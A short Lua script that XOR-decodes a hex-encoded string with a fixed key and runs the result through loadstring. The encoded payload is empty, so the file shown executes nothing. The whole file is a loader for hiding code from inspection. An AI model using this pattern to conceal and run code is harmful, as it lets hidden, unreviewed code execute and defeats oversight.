local k={188,235,90,204,8,82,7,199,131,84,80,44,163,228,86,223,69,249,45,221,22,90,241,26,141,198,120,189,87,177,25,28}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
